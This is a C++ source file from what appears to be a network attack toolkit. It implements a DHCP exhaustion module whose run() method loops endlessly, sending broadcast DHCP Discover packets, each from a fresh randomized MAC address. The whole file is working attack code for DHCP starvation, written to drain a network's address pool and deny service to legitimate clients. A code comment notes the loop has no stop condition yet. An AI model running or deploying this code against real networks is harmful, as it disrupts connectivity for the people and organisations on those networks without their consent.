#include "DHCPExhaustion.h"

#include <pcapplusplus/EthLayer.h>

#include <chrono>
#include <random>
#include <ranges>
#include <thread>

#include "../protocols/DHCP.h"
#include "../utilities/MACUtils.h"

void DHCPExhaustion::run() {
  auto src_mac = serratia::utils::randomize_mac();
  const auto eth_layer = std::make_shared<pcpp::EthLayer>(src_mac, pcpp::MacAddress::Broadcast);

  const auto src_ip = pcpp::IPv4Address("0.0.0.0");
  const auto dst_ip = pcpp::IPv4Address("255.255.255.255");
  const auto ip_layer = std::make_shared<pcpp::IPv4Layer>(src_ip, dst_ip);
  const auto udp_layer = std::make_shared<pcpp::UdpLayer>(68, 67);
  const auto common_config = serratia::protocols::DHCPCommon(eth_layer, ip_layer, udp_layer);

  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<uint32_t> distrib;

  while (true) {
    // TODO: Add a flag for breaking the loop eventually
    const auto transaction_id = distrib(gen);

    std::array<std::uint8_t, 16> client_hardware_addr{};
    std::ranges::copy(src_mac.toByteArray() | std::ranges::views::take(6), client_hardware_addr.begin());

    auto discover_config = serratia::protocols::DHCPMessage::Discover(
        common_config, transaction_id, client_hardware_addr, 0, 0, 0x8000, std::nullopt, std::nullopt, std::nullopt,
        std::nullopt, std::nullopt, std::nullopt, std::nullopt);

    const auto packet = discover_config.build();
    send_dev_->sendPacket(*(packet.getRawPacket()));
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));

    src_mac = serratia::utils::randomize_mac();
    common_config.eth_layer->setSourceMac(src_mac);
  }
}